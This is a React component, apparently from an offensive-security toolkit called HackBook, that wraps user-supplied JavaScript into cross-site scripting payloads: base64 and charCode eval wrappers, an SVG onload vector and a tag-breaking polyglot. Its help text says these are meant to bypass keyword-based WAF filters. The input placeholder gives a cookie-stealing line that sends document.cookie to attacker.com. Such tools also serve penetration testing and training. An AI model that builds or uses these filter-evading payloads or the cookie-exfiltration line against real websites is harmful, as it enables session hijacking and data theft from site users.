import React, { useState } from 'react';
import { Zap, Code2 } from 'lucide-react';
import { CodeBlock } from '../../components/CodeBlock';

export const XSSTool: React.FC = () => {
  const [payload, setPayload] = useState("alert('HackBook XSS')");
  const [results, setResults] = useState<{ b64: string; charCode: string; svg: string; polyglot: string } | null>(null);

  const obfuscate = () => {
    const b64 = btoa(payload);
    const b64Payload = `eval(atob('${b64}'))`;

    const chars = payload.split('').map(c => c.charCodeAt(0)).join(',');
    const charCodePayload = `eval(String.fromCharCode(${chars}))`;

    const svgPayload = `<svg/onload=${payload}>`;
    const polyglot = `javascript://%250A${payload}//"/*\\'/*\\"/*--></title></style></textarea></script><script>${payload}</script>`; // Simplified polyglot

    setResults({ b64: b64Payload, charCode: charCodePayload, svg: svgPayload, polyglot: polyglot });
  };

  return (
    <div className="space-y-8">
      <div className="space-y-4">
        <div className="space-y-2">
          <label className="text-[10px] font-bold text-white/40 uppercase tracking-[0.2em]">Source JavaScript Payload</label>
          <textarea
            className="w-full h-36 bg-[#0a0f16]/60 border border-white/5 rounded-xl p-5 font-mono text-sm text-[#9fef00] focus:outline-none focus:ring-1 focus:ring-[#9fef00]/40 transition-all resize-none"
            value={payload}
            onChange={(e) => setPayload(e.target.value)}
            placeholder="e.g. fetch('http://attacker.com/steal?c=' + document.cookie)"
          />
        </div>
        <button
          onClick={obfuscate}
          className="w-full py-4 bg-[#9fef00] text-black font-bold rounded-xl hover:shadow-[0_0_30px_rgba(159,239,0,0.3)] transition-all uppercase tracking-[0.2em] text-[11px] hover:scale-[1.01] active:scale-[0.99]"
        >
          Generate Vectors
        </button>
      </div>

      {results && (
        <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
            <div className="space-y-4">
              <div className="flex items-center gap-2.5">
                <div className="w-1.5 h-1.5 rounded-full bg-[#9fef00] animate-pulse" />
                <span className="text-[10px] font-bold text-white/60 uppercase tracking-widest">Base64 Encoded Execution</span>
              </div>
              <CodeBlock code={results.b64} language="javascript" title="eval-atob-wrapper" />
            </div>
            <div className="space-y-4">
              <div className="flex items-center gap-2.5">
                <div className="w-1.5 h-1.5 rounded-full bg-[#9fef00] animate-pulse" />
                <span className="text-[10px] font-bold text-white/60 uppercase tracking-widest">CharCode Dynamic Injection</span>
              </div>
              <CodeBlock code={results.charCode} language="javascript" title="eval-fromCharCode-wrapper" />
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
            <div className="space-y-4">
              <div className="flex items-center gap-2.5">
                <div className="w-1.5 h-1.5 rounded-full bg-[#9fef00] animate-pulse" />
                <span className="text-[10px] font-bold text-white/60 uppercase tracking-widest">SVG Vector</span>
              </div>
              <CodeBlock code={results.svg} language="html" title="SVG OnLoad" />
            </div>
            <div className="space-y-4">
              <div className="flex items-center gap-2.5">
                <div className="w-1.5 h-1.5 rounded-full bg-[#9fef00] animate-pulse" />
                <span className="text-[10px] font-bold text-white/60 uppercase tracking-widest">Polyglot Context Break</span>
              </div>
              <CodeBlock code={results.polyglot} language="html" title="Polyglot Wrapper" />
            </div>
          </div>
        </div>
      )}

      {!results && (
        <div className="flex items-center gap-3 p-5 border border-white/5 bg-white/[0.01] rounded-2xl">
          <Code2 className="w-5 h-5 text-white/20" />
          <p className="text-[12px] text-white/30 font-medium tracking-tight">
            Use these obfuscators to bypass basic keyword-based filters (e.g. WAFs blocking <code>alert</code>, <code>script</code>, or <code>eval</code> directly).
          </p>
        </div>
      )}
    </div>
  );
};